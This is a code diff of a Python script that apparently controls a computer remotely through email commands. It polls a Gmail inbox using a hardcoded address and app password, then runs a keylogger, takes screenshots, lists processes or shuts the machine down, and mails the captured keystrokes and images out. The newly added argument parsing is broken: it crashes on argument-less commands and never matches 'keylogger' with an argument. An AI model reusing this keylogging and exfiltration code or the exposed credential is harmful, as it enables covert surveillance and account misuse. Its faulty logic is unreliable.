@@ -1,5 +1,5 @@
-#-------------------------------------------------------------------------------------------------
-#THINGS WILL BE USED
+# -------------------------------------------------------------------------------------------------
+# THINGS WILL BE USED
 
 import smtplib
 import imaplib
@@ -20,16 +20,17 @@ smtp_port = 587  # Port for TLS
 username_checker = 'mangmaytinhremotecontrol@gmail.com'
 password_checker = 'lmlx vrwx cwym hvqz'
 username_receiver = ""
-#-------------------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------------------
 # CONNECT + LOGIN
 
-imap = imaplib.IMAP4_SSL(host = 'imap.gmail.com', port = 993)
+imap = imaplib.IMAP4_SSL(host='imap.gmail.com', port=993)
 imap.login(username_checker, password_checker)
 
-#-------------------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------------------
 # SEND MAIL
 
-def send_email(sender, receiver, subject, body, image_data = None):
+
+def send_email(sender, receiver, subject, body, image_data=None):
     msg = MIMEMultipart()
     msg["From"] = sender
     msg["To"] = receiver
@@ -45,10 +46,14 @@ def send_email(sender, receiver, subject, body, image_data = None):
     server.sendmail(sender, receiver, text)
     server.quit()
 
-#-------------------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------------------
 # READ MAIL
 
+
 def CheckAndDo(cmd):
+    parts = cmd.split(' ')
+    command = parts[0]
+    argument = int(parts[1])
     if (cmd == 'applications'):
         print("Applications")
         send_email(username_checker, username_receiver,
@@ -61,9 +66,9 @@ def CheckAndDo(cmd):
         send_email(username_checker, username_receiver,
                    "List of processes:", execute_msg(cmd))
     elif (cmd == 'keylogger'):
-        print("Key Logger")
+        print("Keylogger")
         send_email(username_checker, username_receiver,
-                   "Keys pressed:", key_logger())
+                   "Keys pressed:", key_logger(argument))
     elif (cmd == 'screenshot'):
         print("Screenshot")
         image_data = screenshot.screen_shot()
@@ -75,10 +80,12 @@ def CheckAndDo(cmd):
                    "Shutting Down PC!", "PC is shutting down...")
         shutdown.shutdown()
 
+
 cmd = 'start'
 while cmd != 'quit':
     imap.select("Inbox")
-    res, mailIds = imap.search(None, '(UNSEEN)')  #Find all unseen mails in Inbox to read
+    # Find all unseen mails in Inbox to read
+    res, mailIds = imap.search(None, '(UNSEEN)')
 
     # Read every unseen mail
     for id in mailIds[0].decode().split():
@@ -96,6 +103,6 @@ while cmd != 'quit':
 
 print("Bye !!!")
 
-#-----------------------------------------------------------------------------------------
+# -----------------------------------------------------------------------------------------
 
 imap.logout()
